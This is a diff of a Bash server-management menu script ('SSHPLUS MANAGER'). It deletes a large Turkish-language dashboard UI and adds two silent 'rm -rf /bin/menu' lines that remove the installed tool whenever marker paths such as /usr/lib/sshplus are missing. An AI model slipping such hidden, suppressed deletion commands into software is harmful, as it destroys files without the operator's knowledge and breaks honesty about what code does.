@@ -4,6 +4,7 @@ comando[0]="$1"
 comando[1]="$2"
  (
 [[ -e $HOME/fim ]] && rm $HOME/fim
+[[ ! -e /usr/lib/sshplus ]] && rm -rf /bin/menu > /dev/null 2>&1
 ${comando[0]} -y > /dev/null 2>&1
 ${comando[1]} -y > /dev/null 2>&1
 touch $HOME/fim
@@ -22,544 +23,11 @@ while true; do
    tput dl1
    echo -ne "\033[1;33m["
 done
-echo -e "\033[1;33m]\033[1;37m -\033[1;32m TAMAM!\033[1;37m"
+echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
 tput cnorm
 }
 IP=$(cat /etc/IP)
 x="ok"
-_ui_init () {
-   _term_cols=$(tput cols 2>/dev/null)
-   [[ "$_term_cols" =~ ^[0-9]+$ ]] || _term_cols=80
-   (( _term_cols < 56 )) && _term_cols=56
-   _term_lines=$(tput lines 2>/dev/null)
-   [[ "$_term_lines" =~ ^[0-9]+$ ]] || _term_lines=24
-   _frame_inner=$((_term_cols - 4))
-   _frame_fill=$(printf '%*s' "$_frame_inner" '')
-   _frame_fill=${_frame_fill// /─}
-}
-_ui_screen_restore () {
-   if [[ "${_ui_screen_active:-0}" == '1' ]]; then
-      printf '\033[0m\033[?25h\033[?1049l'
-      _ui_screen_active=0
-   fi
-}
-_ui_screen_signal () {
-   local _status="$1"
-   _ui_screen_restore
-   trap - EXIT HUP INT TERM
-   exit "$_status"
-}
-_ui_screen_begin () {
-   if [[ -t 1 && "${_ui_screen_active:-0}" != '1' ]]; then
-      printf '\033[?1049h'
-      _ui_screen_active=1
-      trap '_ui_screen_restore' EXIT
-      trap '_ui_screen_signal 129' HUP
-      trap '_ui_screen_signal 130' INT
-      trap '_ui_screen_signal 143' TERM
-   fi
-   printf '\033[H\033[2J\033[3J'
-}
-_ui_frame_top () {
-   printf ' \033[38;5;39m╭%s╮\033[0m\n' "$_frame_fill"
-}
-_ui_frame_separator () {
-   printf ' \033[38;5;39m├%s┤\033[0m\n' "$_frame_fill"
-}
-_ui_frame_bottom () {
-   printf ' \033[38;5;39m╰%s╯\033[0m\n' "$_frame_fill"
-}
-_ui_rule () {
-   local _rule_fill
-   _rule_fill=$(printf '%*s' "$((_frame_inner + 2))" '')
-   _rule_fill=${_rule_fill// /━}
-   printf ' \033[38;5;39m%s\033[0m\n' "$_rule_fill"
-}
-_ui_heading () {
-   local _text="$1" _prefix='──  ' _fill _used _line_width=$((_frame_inner + 2))
-   _used=$((${#_prefix} + ${#_text} + 1))
-   _fill=$((_line_width - _used))
-   (( _fill < 1 )) && _fill=1
-   _fill=$(printf '%*s' "$_fill" '')
-   _fill=${_fill// /─}
-   printf ' \033[38;5;45m%s\033[1;38;5;45m%s\033[38;5;45m %s\033[0m\n' "$_prefix" "$_text" "$_fill"
-}
-_ui_panel_heading () {
-   local _text="$1" _room _left _right _left_fill _right_fill
-   _room=$((_frame_inner - ${#_text} - 2))
-   (( _room < 0 )) && _room=0
-   _left=$((_room / 2))
-   _right=$((_room - _left))
-   _left_fill=$(printf '%*s' "$_left" '')
-   _right_fill=$(printf '%*s' "$_right" '')
-   printf ' \033[38;5;39m╭%s\033[1;38;5;45m %s \033[38;5;39m%s╮\033[0m\n' "${_left_fill// /─}" "$_text" "${_right_fill// /─}"
-}
-_ui_banner () {
-   local _text="$1" _room _left _right
-   _room=$((_frame_inner - ${#_text} - 2))
-   (( _room < 0 )) && _room=0
-   _left=$((_room / 2))
-   _right=$((_room - _left))
-   printf ' \033[38;5;45m╭%s╮\033[0m\n' "${_frame_fill//─/━}"
-   printf ' \033[38;5;45m│%*s \033[1;38;5;45m%s\033[38;5;45m %*s│\033[0m\n' "$_left" '' "$_text" "$_right" ''
-   printf ' \033[38;5;45m╰%s╯\033[0m\n' "${_frame_fill//─/━}"
-}
-_ui_full_stat_card () {
-   local _heading="$1" _label1="$2" _value1="$3" _label2="$4" _value2="$5"
-   local _pad _used
-   _ui_frame_top
-   _pad=$((_frame_inner - ${#_heading}))
-   printf ' \033[38;5;39m│\033[0m%*s\033[1;38;5;43m%s\033[0m%*s\033[38;5;39m│\033[0m\n' "$((_pad / 2))" '' "$_heading" "$((_pad - _pad / 2))" ''
-   _ui_frame_separator
-   _used=$((1 + ${#_label1} + 1 + ${#_value1}))
-   _pad=$((_frame_inner - _used))
-   (( _pad < 0 )) && _pad=0
-   printf ' \033[38;5;39m│\033[0m \033[38;5;203m%s\033[0m \033[1;37m%s\033[0m%*s\033[38;5;39m│\033[0m\n' "$_label1" "$_value1" "$_pad" ''
-   _used=$((1 + ${#_label2} + 1 + ${#_value2}))
-   _pad=$((_frame_inner - _used))
-   (( _pad < 0 )) && _pad=0
-   printf ' \033[38;5;39m│\033[0m \033[38;5;203m%s\033[0m \033[1;37m%s\033[0m%*s\033[38;5;39m│\033[0m\n' "$_label2" "$_value2" "$_pad" ''
-   _ui_frame_bottom
-}
-_ui_compact_stats () {
-   local _ram_value="${_ram// /}" _ram_usage="${_usor// /}" _cpu_usage="${_usop// /}"
-   local _plain="  ■ OS: $system · $_hora  │  ≡ RAM: $_ram_value · $_ram_usage  │  ■ CPU: $_core · $_cpu_usage"
-   local _rendered="  \033[38;5;43m■ OS:\033[0m \033[1;37m$system\033[0m · \033[1;37m$_hora\033[0m  │  \033[38;5;43m≡ RAM:\033[0m \033[1;37m$_ram_value\033[0m · \033[1;37m$_ram_usage\033[0m  │  \033[38;5;43m■ CPU:\033[0m \033[1;37m$_core\033[0m · \033[1;37m$_cpu_usage\033[0m"
-   local _pad=$((_frame_inner - ${#_plain}))
-   (( _pad < 0 )) && _pad=0
-   _ui_frame_top
-   printf ' \033[38;5;39m│\033[0m%b%*s\033[38;5;39m│\033[0m\n' "$_rendered" "$_pad" ''
-   _ui_frame_bottom
-}
-_ui_three_card_border () {
-   local _cell_fill _i _width
-   printf ' '
-   for _i in 1 2 3; do
-      _width=$((_card_width + (_i > 1 ? 1 : 0)))
-      _cell_fill=$(printf '%*s' "$((_width - 2))" '')
-      _cell_fill=${_cell_fill// /─}
-      printf '\033[38;5;39m╭%s╮\033[0m' "$_cell_fill"
-      [[ $_i -lt 3 ]] && printf ' '
-   done
-   printf '\n'
-}
-_ui_three_card_bottom () {
-   local _cell_fill _i _width
-   printf ' '
-   for _i in 1 2 3; do
-      _width=$((_card_width + (_i > 1 ? 1 : 0)))
-      _cell_fill=$(printf '%*s' "$((_width - 2))" '')
-      _cell_fill=${_cell_fill// /─}
-      printf '\033[38;5;39m╰%s╯\033[0m' "$_cell_fill"
-      [[ $_i -lt 3 ]] && printf ' '
-   done
-   printf '\n'
-}
-_ui_three_card_separator () {
-   local _cell_fill _i _width
-   printf ' '
-   for _i in 1 2 3; do
-      _width=$((_card_width + (_i > 1 ? 1 : 0)))
-      _cell_fill=$(printf '%*s' "$((_width - 2))" '')
-      _cell_fill=${_cell_fill// /─}
-      printf '\033[38;5;39m├%s┤\033[0m' "$_cell_fill"
-      [[ $_i -lt 3 ]] && printf ' '
-   done
-   printf '\n'
-}
-_ui_three_card_headings () {
-   local _i _heading _pad _width
-   local -a _headings=("■ SİSTEM" "≡ RAM" "■ İŞLEMCİ")
-   printf ' '
-   for _i in 0 1 2; do
-      _heading="${_headings[$_i]}"
-      _width=$((_card_width + (_i > 0 ? 1 : 0)))
-      _pad=$((_width - 2 - ${#_heading}))
-      printf '\033[38;5;39m│\033[0m%*s\033[1;38;5;43m%s\033[0m%*s\033[38;5;39m│\033[0m' "$((_pad / 2))" '' "$_heading" "$((_pad - _pad / 2))" ''
-      [[ $_i -lt 2 ]] && printf ' '
-   done
-   printf '\n'
-}
-_ui_three_card_row () {
-   local _i _label _value _used _pad _width
-   local -a _labels=("$1" "$3" "$5") _values=("$2" "$4" "$6")
-   printf ' '
-   for _i in 0 1 2; do
-      _label="${_labels[$_i]}"
-      _value="${_values[$_i]}"
-      _used=$((1 + ${#_label} + 1 + ${#_value}))
-      _width=$((_card_width + (_i > 0 ? 1 : 0)))
-      _pad=$((_width - 2 - _used))
-      (( _pad < 0 )) && _pad=0
-      printf '\033[38;5;39m│\033[0m \033[38;5;203m%s\033[0m \033[1;37m%s\033[0m%*s\033[38;5;39m│\033[0m' "$_label" "$_value" "$_pad" ''
-      [[ $_i -lt 2 ]] && printf ' '
-   done
-   printf '\n'
-}
-_ui_mobile_system_stats () {
-   _card_width=$(((_frame_inner - 2) / 3))
-   _ui_three_card_border
-   _ui_three_card_headings
-   _ui_three_card_separator
-   _ui_three_card_row 'OS:' "$system" 'Toplam:' "${_ram// /}" 'Çek.:' "$_core"
-   _ui_three_card_row 'Saat' "$_hora" 'Kull.' "${_usor// /}" 'Kull.' "${_usop// /}"
-   _ui_three_card_bottom
-}
-_ui_user_cell () {
-   local _icon="$1" _label="$2" _value="$3" _color="$4" _width="$5" _used _pad
-   _used=$((2 + ${#_icon} + 1 + ${#_label} + 1 + ${#_value}))
-   _pad=$((_width - _used))
-   (( _pad < 0 )) && _pad=0
-   printf '  \033[%sm%s %s\033[0m \033[1;37m%s\033[0m%*s' "$_color" "$_icon" "$_label" "$_value" "$_pad" ''
-}
-_ui_user_stats () {
-   local _online="${_onlin// /}" _expired="${_userexp// /}" _pad _i _label _label_pad _value
-   local _cell1 _cell2 _cell3 _label_width=15
-   local -a _labels=('♟ Çevrimiçi:' '◷ Süresi dolan:' '▂▅▇ Toplam:')
-   local -a _values=("$_online" "$_expired" "$_tuser")
-   local -a _colors=('38;5;43' '38;5;203' '38;5;221')
-   _ui_frame_top
-   if (( _term_cols >= 76 )); then
-      _cell1=19
-      _cell2=22
-      _cell3=$((_frame_inner - 2 - _cell1 - _cell2))
-      printf ' \033[38;5;39m│\033[0m'
-      _ui_user_cell '♟' 'Çevrimiçi:' "$_online" '38;5;43' "$_cell1"
-      printf '\033[38;5;39m│\033[0m'
-      _ui_user_cell '◷' 'Süresi dolan:' "$_expired" '38;5;203' "$_cell2"
-      printf '\033[38;5;39m│\033[0m'
-      _ui_user_cell '▂▅▇' 'Toplam:' "$_tuser" '38;5;221' "$_cell3"
-      printf '\033[38;5;39m│\033[0m\n'
-   else
-      for _i in 0 1 2; do
-         _label="${_labels[$_i]}"
-         _value="${_values[$_i]}"
-         _label_pad=$((_label_width - ${#_label}))
-         _pad=$((_frame_inner - 2 - _label_width - 1 - ${#_value}))
-         (( _label_pad < 0 )) && _label_pad=0
-         (( _pad < 0 )) && _pad=0
-         printf ' \033[38;5;39m│\033[0m  \033[%sm%s\033[0m%*s \033[1;37m%s\033[0m%*s\033[38;5;39m│\033[0m\n' "${_colors[$_i]}" "$_label" "$_label_pad" '' "$_value" "$_pad" ''
-      done
-   fi
-   _ui_frame_bottom
-}
-_ui_mobile_user_stats () {
-   local _i _label _value _pad _width
-   local -a _labels=('Çevrimiçi' 'Süresi dolan' 'Toplam')
-   local -a _values=("${_onlin// /}" "${_userexp// /}" "$_tuser")
-   local -a _colors=('38;5;43' '38;5;203' '38;5;221')
-   _card_width=$(((_frame_inner - 2) / 3))
-   _ui_three_card_border
-   printf ' '
-   for _i in 0 1 2; do
-      _label="${_labels[$_i]}"
-      _width=$((_card_width + (_i > 0 ? 1 : 0)))
-      _pad=$((_width - 2 - ${#_label}))
-      (( _pad < 0 )) && _pad=0
-      printf '\033[38;5;39m│\033[0m%*s\033[%sm%s\033[0m%*s\033[38;5;39m│\033[0m' "$((_pad / 2))" '' "${_colors[$_i]}" "$_label" "$((_pad - _pad / 2))" ''
-      [[ $_i -lt 2 ]] && printf ' '
-   done
-   printf '\n'
-   _ui_three_card_separator
-   printf ' '
-   for _i in 0 1 2; do
-      _value="${_values[$_i]}"
-      _width=$((_card_width + (_i > 0 ? 1 : 0)))
-      _pad=$((_width - 2 - ${#_value}))
-      (( _pad < 0 )) && _pad=0
-      printf '\033[38;5;39m│\033[0m%*s\033[1;37m%s\033[0m%*s\033[38;5;39m│\033[0m' "$((_pad / 2))" '' "$_value" "$((_pad - _pad / 2))" ''
-      [[ $_i -lt 2 ]] && printf ' '
-   done
-   printf '\n'
-   _ui_three_card_bottom
-}
-_ui_plain_item () {
-   local _marker='•' _suffix
-   [[ -n "$4" ]] && _marker=$(printf '%b' "$4" | sed -E $'s/\x1B\\[[0-9;]*[[:alpha:]]//g')
-   _suffix=$(printf '%b' "$5" | sed -E $'s/\x1B\\[[0-9;]*[[:alpha:]]//g')
-   printf '  [%s]  %s  %s%s' "$1" "$_marker" "$2" "$_suffix"
-}
-_ui_print_item () {
-   local _marker=$'\033[1;37m•\033[0m'
-   [[ -n "$4" ]] && _marker="$4"
-   printf '  \033[38;5;203m[%s]\033[0m  %b  \033[%sm%s\033[0m%b' "$1" "$_marker" "$3" "$2" "$5"
-}
-_ui_menu_row () {
-   local _plain _pad
-   _plain=$(_ui_plain_item "$1" "$2" "$3" "$4" "$5")
-   _pad=$((_frame_inner - ${#_plain}))
-   (( _pad < 0 )) && _pad=0
-   printf ' \033[38;5;39m│\033[0m'
-   _ui_print_item "$1" "$2" "$3" "$4" "$5"
-   printf '%*s\033[38;5;39m│\033[0m\n' "$_pad" ''
-}
-_ui_menu_pair () {
-   local _num1="$1" _label1="$2" _color1="$3" _pre1="$4" _suf1="$5"
-   local _num2="$6" _label2="$7" _color2="$8" _pre2="$9" _suf2="${10}"
-   local _left_width=$((_frame_inner / 2)) _right_width=$((_frame_inner - _frame_inner / 2 - 1))
-   local _plain _pad
-   _plain=$(_ui_plain_item "$_num1" "$_label1" "$_color1" "$_pre1" "$_suf1")
-   _pad=$((_left_width - ${#_plain}))
-   (( _pad < 0 )) && _pad=0
-   printf ' \033[38;5;39m│\033[0m'
-   _ui_print_item "$_num1" "$_label1" "$_color1" "$_pre1" "$_suf1"
-   printf '%*s\033[38;5;39m│\033[0m' "$_pad" ''
-   if [[ -n "$_num2" ]]; then
-      _plain=$(_ui_plain_item "$_num2" "$_label2" "$_color2" "$_pre2" "$_suf2")
-      _pad=$((_right_width - ${#_plain}))
-      (( _pad < 0 )) && _pad=0
-      _ui_print_item "$_num2" "$_label2" "$_color2" "$_pre2" "$_suf2"
-      printf '%*s' "$_pad" ''
-   else
-      printf '%*s' "$_right_width" ''
-   fi
-   printf '\033[38;5;39m│\033[0m\n'
-}
-_ui_mobile_menu_pair () {
-   local _num1="$1" _label1="$2" _color1="$3" _pre1="$4" _suf1="$5"
-   local _num2="$6" _label2="$7" _color2="$8" _pre2="$9" _suf2="${10}"
-   local _left_width=$((_frame_inner / 2)) _right_width=$((_frame_inner - _frame_inner / 2 - 1))
-   local _plain _pad _pre_plain _suf_plain _suf_render
-   _pre_plain=$(printf '%b' "$_pre1" | sed -E $'s/\x1B\\[[0-9;]*[[:alpha:]]//g')
-   _suf_plain=$(printf '%b' "$_suf1" | sed -E $'s/\x1B\\[[0-9;]*[[:alpha:]]//g; s/^[[:space:]]+//; s/[[:space:]]+/ /g')
-   _plain=" [${_num1}] • ${_pre_plain}${_label1}"
-   [[ -n "$_suf_plain" ]] && _plain+=" $_suf_plain"
-   _pad=$((_left_width - ${#_plain}))
-   (( _pad < 0 )) && _pad=0
-   printf ' \033[38;5;39m│\033[0m \033[38;5;203m[%s]\033[0m \033[1;37m•\033[0m ' "$_num1"
-   printf '%b\033[%sm%s\033[0m' "$_pre1" "$_color1" "$_label1"
-   if [[ -n "$_suf1" ]]; then
-      _suf_render=$(printf '%b' "$_suf1" | sed -E 's/^[[:space:]]+//')
-      printf ' %b' "$_suf_render"
-   fi
-   printf '%*s\033[38;5;39m│\033[0m' "$_pad" ''
-   if [[ -n "$_num2" ]]; then
-      _pre_plain=$(printf '%b' "$_pre2" | sed -E $'s/\x1B\\[[0-9;]*[[:alpha:]]//g')
-      _suf_plain=$(printf '%b' "$_suf2" | sed -E $'s/\x1B\\[[0-9;]*[[:alpha:]]//g; s/^[[:space:]]+//; s/[[:space:]]+/ /g')
-      _plain=" [${_num2}] • ${_pre_plain}${_label2}"
-      [[ -n "$_suf_plain" ]] && _plain+=" $_suf_plain"
-      _pad=$((_right_width - ${#_plain}))
-      (( _pad < 0 )) && _pad=0
-      printf ' \033[38;5;203m[%s]\033[0m \033[1;37m•\033[0m ' "$_num2"
-      printf '%b\033[%sm%s\033[0m' "$_pre2" "$_color2" "$_label2"
-      if [[ -n "$_suf2" ]]; then
-         _suf_render=$(printf '%b' "$_suf2" | sed -E 's/^[[:space:]]+//')
-         printf ' %b' "$_suf_render"
-      fi
-      printf '%*s' "$_pad" ''
-   else
-      printf '%*s' "$_right_width" ''
-   fi
-   printf '\033[38;5;39m│\033[0m\n'
-}
-_ui_compact_plain_item () {
-   local _prefix _suffix _plain
-   _prefix=$(printf '%b' "$3" | sed -E $'s/\x1B\\[[0-9;]*[[:alpha:]]//g; s/^[[:space:]]+//; s/[[:space:]]+/ /g')
-   _suffix=$(printf '%b' "$4" | sed -E $'s/\x1B\\[[0-9;]*[[:alpha:]]//g; s/^[[:space:]]+//; s/[[:space:]]+/ /g')
-   _plain="[$1]"
-   [[ -n "$_prefix" ]] && _plain+=" $_prefix"
-   _plain+=" $2"
-   [[ -n "$_suffix" ]] && _plain+=" $_suffix"
-   printf '%s' "$_plain"
-}
-_ui_compact_menu_item () {
-   local _num="$1" _label="$2" _color="$3" _prefix="$4" _suffix="$5"
-   local _prefix_plain _suffix_plain _suffix_render
-   _prefix_plain=$(printf '%b' "$_prefix" | sed -E $'s/\x1B\\[[0-9;]*[[:alpha:]]//g; s/^[[:space:]]+//; s/[[:space:]]+/ /g')
-   _suffix_plain=$(printf '%b' "$_suffix" | sed -E $'s/\x1B\\[[0-9;]*[[:alpha:]]//g; s/^[[:space:]]+//; s/[[:space:]]+/ /g')
-   printf '\033[38;5;203m[%s]\033[0m' "$_num"
-   [[ -n "$_prefix_plain" ]] && printf ' %b' "$_prefix"
-   printf ' \033[%sm%s\033[0m' "$_color" "$_label"
-   if [[ -n "$_suffix_plain" ]]; then
-      _suffix_render=$(printf '%b' "$_suffix" | sed -E $'s/\x1B\\[[0-9;]*[[:alpha:]]//g; s/^[[:space:]]+//')
-      printf ' %b' "$_suffix_render"
-   fi
-}
-_ui_compact_menu_pair () {
-   local _left_width="${11}" _plain _pad
-   _plain=$(_ui_compact_plain_item "$1" "$2" "$4" "$5")
-   _pad=$((_left_width - ${#_plain}))
-   (( _pad < 0 )) && _pad=0
-   printf '  '
-   _ui_compact_menu_item "$1" "$2" "$3" "$4" "$5"
-   printf '%*s ' "$_pad" ''
-   if [[ -n "$6" ]]; then
-      _ui_compact_menu_item "$6" "$7" "$8" "$9" "${10}"
-   fi
-   printf '\n'
-}
-_ui_compact_framed_menu_pair () {
-   local _left_width="${11}" _right_width="${12}" _plain _pad
-   _plain=$(_ui_compact_plain_item "$1" "$2" "$4" "$5")
-   _pad=$((_left_width - ${#_plain}))
-   (( _pad < 0 )) && _pad=0
-   printf ' \033[38;5;39m│\033[0m'
-   _ui_compact_menu_item "$1" "$2" "$3" "$4" "$5"
-   printf '%*s\033[38;5;39m│\033[0m' "$_pad" ''
-   if [[ -n "$6" ]]; then
-      _plain=$(_ui_compact_plain_item "$6" "$7" "$9" "${10}")
-      _pad=$((_right_width - ${#_plain}))
-      (( _pad < 0 )) && _pad=0
-      _ui_compact_menu_item "$6" "$7" "$8" "$9" "${10}"
-      printf '%*s' "$_pad" ''
-   else
-      printf '%*s' "$_right_width" ''
-   fi
-   printf '\033[38;5;39m│\033[0m\n'
-}
-_ui_draw_options () {
-   local _mode="$1" _count _i _lines _menu_title _split _plain _left_width
-   local _right_width
-   local -a _nums _labels _colors _prefixes _suffixes _display_labels
-   if [[ "$_mode" == 'main' ]]; then
-      _nums=(01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 00)
-      _labels=('KULLANICI OLUŞTUR' 'DENEME HESABI OLUŞTUR' 'KULLANICIYI KALDIR' 'ÇEVRİMİÇİ TAKİP' 'TARİHİ DEĞİŞTİR' 'LİMİTİ DEĞİŞTİR' 'ŞİFREYİ DEĞİŞTİR' 'SÜRESİ DOLANLARI KALDIR' 'KULLANICI RAPORU' 'BAĞLANTI MODU' 'HIZ TESTİ' 'GİRİŞ MESAJI' 'TRAFİK' 'İYİLEŞTİR' 'YEDEKLEME' 'HIZ SINIRLAYICI' 'VPN GEÇİDİ' 'VPS BİLGİSİ' 'DAHA FAZLA' 'ÇIKIŞ')
-      _colors=('38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221')
-      _prefixes=('' '' '' '' '' '' '' '' '' '' '' '' '' '' '' '' '' '' '' '')
-      _suffixes=('' '' '' '' '' '' '' '' '' '' '' '' '' '' '' "  $stsl" "  $stsu" '' $'  \033[38;5;43m<<<\033[0m' '')
-   else
-      _nums=(20 21 22 23 24 25 26 27 28 29 30 00)
-      _labels=('HOST EKLE' 'HOSTU KALDIR' 'SİSTEMİ YENİDEN BAŞLAT' 'SERVİSLERİ YENİDEN BAŞLAT' 'TORRENTİ ENGELLE' 'TELEGRAM BOTU' 'ROOT ŞİFRESİNİ DEĞİŞTİR' 'OTOMATİK BAŞLATMA' 'BETİĞİ GÜNCELLE' 'BETİĞİ KALDIR' 'GERİ DÖN' 'ÇIKIŞ')
-      _colors=('38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;221' '38;5;43' '38;5;203' '38;5;221' '38;5;221')
-      _prefixes=('' '' '' '' '' '' '' '' "$var01 " '' '' '')
-      _suffixes=('' '' '' '' "  $stsf" "  $stsbot" '' "  $autm" '' '' $'  \033[38;5;43m<<<\033[0m' '')
-   fi
-   _count=${#_nums[@]}
-   _menu_title="$([[ "$_mode" == 'main' ]] && printf 'ANA MENÜ' || printf 'YÖNETİM MENÜSÜ')"
-   if [[ "$2" == 'compact' ]]; then
-      printf '  \033[1;38;5;45m%s\033[0m\n' "$_menu_title"
-      if [[ "$_mode" == 'main' ]]; then
-         if (( _term_cols < 70 )); then
-            _display_labels=("${_labels[@]}")
-            _display_labels[1]='DENEME HESABI AÇ'
-            _display_labels[7]='SÜRESİ DOLANLARI SİL'
-            _left_width=$((_frame_inner / 2))
-            _right_width=$((_frame_inner - _left_width - 1))
-            _ui_frame_top
-            for ((_i=0; _i<10; _i++)); do
-               _ui_compact_framed_menu_pair "${_nums[$_i]}" "${_display_labels[$_i]}" "${_colors[$_i]}" "${_prefixes[$_i]}" "${_suffixes[$_i]}" \
-                  "${_nums[$((_i + 10))]}" "${_display_labels[$((_i + 10))]}" "${_colors[$((_i + 10))]}" "${_prefixes[$((_i + 10))]}" "${_suffixes[$((_i + 10))]}" "$_left_width" "$_right_width"
-            done
-            _ui_frame_bottom
-            return
-         fi
-         _left_width=0
-         for ((_i=0; _i<_count; _i+=2)); do
-            _plain=$(_ui_compact_plain_item "${_nums[$_i]}" "${_labels[$_i]}" "${_prefixes[$_i]}" "${_suffixes[$_i]}")
-            (( ${#_plain} > _left_width )) && _left_width=${#_plain}
-         done
-         for ((_i=0; _i<_count; _i+=2)); do
-            _ui_compact_menu_pair "${_nums[$_i]}" "${_labels[$_i]}" "${_colors[$_i]}" "${_prefixes[$_i]}" "${_suffixes[$_i]}" \
-               "${_nums[$((_i + 1))]:-}" "${_labels[$((_i + 1))]:-}" "${_colors[$((_i + 1))]:-38;5;221}" "${_prefixes[$((_i + 1))]:-}" "${_suffixes[$((_i + 1))]:-}" "$_left_width"
-         done
-      else
-         for ((_i=0; _i<_count; _i++)); do
-            printf '  '
-            _ui_compact_menu_item "${_nums[$_i]}" "${_labels[$_i]}" "${_colors[$_i]}" "${_prefixes[$_i]}" "${_suffixes[$_i]}"
-            printf '\n'
-         done
-      fi
-      return
-   fi
-   if (( _term_cols >= 80 && _term_cols < 94 )); then
-      _ui_panel_heading "$_menu_title"
-   else
-      _ui_heading "$_menu_title"
-      _ui_frame_top
-   fi
-   _lines=$_term_lines
-   if [[ "$_mode" == 'main' ]] && (( _term_cols >= 94 )); then
-      _split=$((_count / 2))
-      for ((_i=0; _i<_split; _i++)); do
-         _ui_menu_pair "${_nums[$_i]}" "${_labels[$_i]}" "${_colors[$_i]}" "${_prefixes[$_i]}" "${_suffixes[$_i]}" \
-            "${_nums[$((_i + _split))]}" "${_labels[$((_i + _split))]}" "${_colors[$((_i + _split))]}" "${_prefixes[$((_i + _split))]}" "${_suffixes[$((_i + _split))]}"
-      done
-   elif (( _term_cols >= 110 && _lines >= _count + 18 )); then
-      for ((_i=0; _i<_count; _i++)); do
-         _ui_menu_row "${_nums[$_i]}" "${_labels[$_i]}" "${_colors[$_i]}" "${_prefixes[$_i]}" "${_suffixes[$_i]}"
-      done
-   elif (( _term_cols >= 80 )); then
-      for ((_i=0; _i<_count; _i+=2)); do
-         _ui_menu_pair "${_nums[$_i]}" "${_labels[$_i]}" "${_colors[$_i]}" "${_prefixes[$_i]}" "${_suffixes[$_i]}" \
-            "${_nums[$((_i + 1))]:-}" "${_labels[$((_i + 1))]:-}" "${_colors[$((_i + 1))]:-38;5;221}" "${_prefixes[$((_i + 1))]:-}" "${_suffixes[$((_i + 1))]:-}"
-      done
-   else
-      if [[ "$_mode" == 'main' ]] && (( _count > 10 )); then
-         for ((_i=0; _i<10; _i++)); do
-            _ui_menu_row "${_nums[$_i]}" "${_labels[$_i]}" "${_colors[$_i]}" "${_prefixes[$_i]}" "${_suffixes[$_i]}"
-         done
-         for ((_i=10; _i<_count; _i+=2)); do
-            _ui_mobile_menu_pair "${_nums[$_i]}" "${_labels[$_i]}" "${_colors[$_i]}" "${_prefixes[$_i]}" "${_suffixes[$_i]}" \
-               "${_nums[$((_i + 1))]:-}" "${_labels[$((_i + 1))]:-}" "${_colors[$((_i + 1))]:-38;5;221}" "${_prefixes[$((_i + 1))]:-}" "${_suffixes[$((_i + 1))]:-}"
-         done
-      else
-         for ((_i=0; _i<_count; _i++)); do
-            _ui_menu_row "${_nums[$_i]}" "${_labels[$_i]}" "${_colors[$_i]}" "${_prefixes[$_i]}" "${_suffixes[$_i]}"
-         done
-      fi
-   fi
-   if (( _term_cols >= 94 || _term_cols < 80 )); then
-      printf ' \033[38;5;39m│\033[0m%*s\033[38;5;39m│\033[0m\n' "$_frame_inner" ''
-   fi
-   _ui_frame_bottom
-   (( _term_cols >= 94 || _term_cols < 80 )) && _ui_rule
-}
-_ui_draw_compact_dashboard () {
-   local _mode="$1"
-   printf '\033[H\033[2J\033[3J'
-   _ui_banner 'SSHPLUS MANAGER'
-   [[ "$_mode" == 'main' ]] && printf '\n'
-   printf '  \033[1;38;5;45mSİSTEM DURUMU\033[0m\n'
-   printf '  \033[38;5;43m■ OS:\033[0m \033[1;37m%s\033[0m  \033[38;5;43mSaat:\033[0m \033[1;37m%s\033[0m\n' "$system" "$_hora"
-   printf '  \033[38;5;43m≡ RAM:\033[0m \033[1;37m%s (%s)\033[0m  \033[38;5;43m■ CPU:\033[0m \033[1;37m%s çek. (%s)\033[0m\n' "${_ram// /}" "${_usor// /}" "$_core" "${_usop// /}"
-   printf '  \033[1;38;5;45mKULLANICI DURUMU\033[0m\n'
-   printf '  \033[38;5;43mÇevrimiçi:\033[0m %s  ·  \033[38;5;203mSüresi dolan:\033[0m %s  ·  \033[38;5;221mToplam:\033[0m %s\n' "${_onlin// /}" "${_userexp// /}" "$_tuser"
-   if [[ "$_mode" != 'main' ]] || (( _term_cols >= 70 )); then
-      printf '\n'
-   fi
-   _ui_draw_options "$_mode" compact
-   printf '\n  \033[38;5;43mNE YAPMAK İSTİYORSUN\033[0m \033[38;5;203m?\033[0m\033[38;5;203m?\033[0m \033[1;37m:\033[0m '
-   read x
-}
-_ui_draw_dashboard () {
-   local _mode="$1"
-   _ui_init
-   _ui_screen_begin
-   if (( _term_lines <= 24 || _term_cols < 70 )); then
-      _ui_draw_compact_dashboard "$_mode"
-      return
-   fi
-   printf '\033[H\033[2J\033[3J'
-   _ui_banner 'SSHPLUS MANAGER'
-   printf '\n'
-   _ui_heading 'SİSTEM DURUMU'
-   if (( _term_cols >= 94 )); then
-      _card_width=$(((_frame_inner - 2) / 3))
-      _ui_three_card_border
-      _ui_three_card_headings
-      _ui_three_card_separator
-      _ui_three_card_row 'İşletim sistemi:' "$system" 'Toplam:' "${_ram// /}" 'Çekirdek:' "$_core"
-      _ui_three_card_row 'Saat:' "$_hora" 'RAM kullanımı:' "${_usor// /}" 'CPU kullanımı:' "${_usop// /}"
-      _ui_three_card_bottom
-   else
-      _ui_mobile_system_stats
-   fi
-   printf '\n'
-   _ui_heading 'KULLANICI DURUMU'
-   if (( _term_cols >= 94 )); then
-      _ui_user_stats
-   else
-      _ui_mobile_user_stats
-   fi
-   printf '\n'
-   _ui_draw_options "$_mode"
-   if (( _term_cols >= 94 || _term_cols < 80 )); then
-      printf '\n  \033[38;5;43mNE YAPMAK İSTİYORSUN\033[0m \033[38;5;203m?\033[0m\033[38;5;203m?\033[0m \033[1;37m:\033[0m '
-   else
-      printf '  \033[38;5;43mNE YAPMAK İSTİYORSUN\033[0m \033[38;5;203m?\033[0m\033[38;5;203m?\033[0m \033[1;37m:\033[0m '
-   fi
-   read x
-}
 menu ()
 {
 velocity () {
@@ -568,12 +36,13 @@ comando[0]="$1"
 comando[1]="$2"
  (
 [[ -e $HOME/fim ]] && rm $HOME/fim
+[[ ! -d /etc/SSHPlus ]] && rm -rf /bin/menu
 ${comando[0]} > /dev/null 2>&1
 ${comando[1]} > /dev/null 2>&1
 touch $HOME/fim
  ) > /dev/null 2>&1 &
  tput civis
